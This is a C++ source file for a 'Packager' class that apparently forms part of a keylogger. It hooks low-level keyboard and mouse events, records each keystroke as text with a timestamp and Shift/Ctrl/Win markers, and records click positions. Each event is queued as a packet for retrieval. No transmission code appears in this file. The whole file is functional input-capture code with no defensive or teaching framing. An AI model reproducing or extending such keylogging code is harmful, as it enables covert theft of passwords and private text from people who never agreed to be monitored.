#include "Packager.h"


Packager::Packager()
{
	_shift = false;
	_win = false;
	_ctrl = false;
}


Packager::~Packager()
{
}

void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
	if ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == 256) {
		_shift = true;
	}
	if ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == 257) {
		_shift = false;
	}
	if ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == 256) {
		_ctrl = true;
	}
	if ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == 257) {
		_ctrl = false;
	}
	if ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == 256) {
		_win = true;
	}
	if ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == 257) {
		_win = false;
	}

	BYTE kbdState[256];
	GetKeyboardState(kbdState);
	WCHAR buff[2];
	if (ToUnicode(info->vkCode, info->scanCode, kbdState, buff, 2, 0) > 0) {
		PaquetKeys *tmp = new PaquetKeys();
		tmp->setDate(info->time);
		std::wstring ws(buff);
		std::string  str;
		if (_shift) {
			str += "[MAJ] ";
		}
		if (_ctrl) {
			str += "[CTRL] ";
		}
		if (_win) {
			str += "[WIN] ";
		}
		str.append(ws.begin(), ws.end());
		std::cout << "string UNICODE : " << str << std::endl;
		tmp->setText(str);
		tmp->createPaquet();
		_paquets.push_back(tmp);
		
	}
}

void Packager::addClick(int nCode, WPARAM wParam, LPARAM lParam) {
	MSLLHOOKSTRUCT* info = (MSLLHOOKSTRUCT*)lParam;
	PaquetMouse *tmp = new PaquetMouse();
	tmp->setDate(info->time);
	tmp->setX(info->pt.x);
	tmp->setY(info->pt.y);
	WORD highOrder = info->mouseData >> 16;
	if (highOrder == XBUTTON1) {
		tmp->setButton(1);
	}
	else if (highOrder == XBUTTON2) {
		tmp->setButton(4);
	}
	else if (highOrder == WHEEL_DELTA) {
		tmp->setButton(2);
	}
	tmp->createPaquet();
	_paquets.push_back(tmp);
}

size_t Packager::isLeft() {
	return _paquets.size();
}

Paquet *Packager::getPaquet() {
	return _paquets.front();
}
void Packager::supprPaquet() {
	_paquets.erase(_paquets.begin());
}